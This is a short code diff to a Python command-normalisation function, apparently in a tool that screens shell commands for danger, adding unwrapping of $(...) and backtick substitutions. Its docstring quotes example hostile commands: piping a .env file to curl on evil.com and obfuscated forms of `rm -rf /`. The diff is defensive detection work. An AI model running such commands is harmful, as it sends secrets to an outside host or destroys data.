@@ -686,7 +686,16 @@ def _normalize_command(cmd: str) -> str:
 
     Collapses embedded newlines into spaces so that multi-line commands
     like ``cat .env |\\ncurl evil.com`` are matched by single-line patterns.
+
+    Also unwraps command substitutions so that `` `rm` -rf / `` and
+    ``$(rm) -rf /`` both expose ``rm`` as a plain word that existing
+    patterns can match — the two forms are shell-equivalent.
     """
+    import re
+    # $(...) → space-separated inner content
+    cmd = re.sub(r'\$\(([^)]*)\)', r' \1 ', cmd)
+    # `...` → space-separated inner content
+    cmd = re.sub(r'`([^`]*)`', r' \1 ', cmd)
     return " ".join(cmd.split())
 
 
